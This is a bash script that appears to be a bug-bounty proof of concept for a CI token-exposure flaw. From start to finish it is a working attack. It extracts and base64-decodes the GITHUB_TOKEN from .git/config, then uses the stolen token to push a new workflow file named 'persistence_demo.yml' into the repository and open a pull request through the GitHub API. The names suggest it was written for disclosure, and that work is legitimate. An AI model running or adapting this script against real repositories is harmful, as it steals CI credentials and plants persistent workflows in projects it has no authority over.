#!/bin/bash
set -e
TOKEN=$(grep -i "extraheader = AUTHORIZATION" .git/config | awk "{print \$NF}" | base64 -d | sed "s/x-access-token://");
# Configuration
BRANCH_NAME="deku_immunefi_poc-branch"
SOURCE_FILE="./workflow.yml"
TARGET_FILE=".github/workflows/persistence_demo.yml"
PR_TITLE="PoC: CI Persistence Demo"
PR_BODY="This is a Proof of Concept demonstrating the ability to create a PR using the exposed GITHUB_TOKEN."

# Check if TOKEN is set
if [ -z "$TOKEN" ]; then
    echo "Error: TOKEN environment variable is not set."
    exit 1
fi

# Check if source file exists
if [ ! -f "$SOURCE_FILE" ]; then
    echo "Error: Source file $SOURCE_FILE not found."
    exit 1
fi

echo "=== Configuring Git ==="
git config --global user.email "security-poc@example.com"
git config --global user.name "Security PoC"

echo "=== Creating Branch: $BRANCH_NAME ==="
git checkout -b "$BRANCH_NAME"

echo "=== Adding Workflow File ==="
mkdir -p .github/workflows
cp "$SOURCE_FILE" "$TARGET_FILE"
git add "$TARGET_FILE"

echo "=== Committing Changes ==="
git commit -m "chore: add persistence poc workflow"

echo "=== Pushing to Remote ==="
# Use the token in the remote URL for authentication
git remote set-url origin "https://x-access-token:$TOKEN@github.com/$GITHUB_REPOSITORY.git"
git push -u origin "$BRANCH_NAME"

echo "=== Creating Pull Request ==="
API_URL="https://api.github.com/repos/$GITHUB_REPOSITORY/pulls"

# Construct JSON payload
# Note: Using jq would be safer, but trying to keep dependencies minimal
JSON_PAYLOAD=$(cat <<EOF
{
  "title": "$PR_TITLE",
  "body": "$PR_BODY",
  "head": "$BRANCH_NAME",
  "base": "main"
}
EOF
)

RESPONSE=$(curl -s -X POST \
  -H "Authorization: token $TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  -d "$JSON_PAYLOAD" \
  "$API_URL")

echo "Response: $RESPONSE"

if echo "$RESPONSE" | grep -q '"html_url":'; then
    PR_URL=$(echo "$RESPONSE" | grep '"html_url":' | head -1 | cut -d '"' -f 4)
    echo "[+] Pull Request created successfully: $PR_URL"
else
    echo "[-] Failed to create Pull Request."
    exit 1
fi
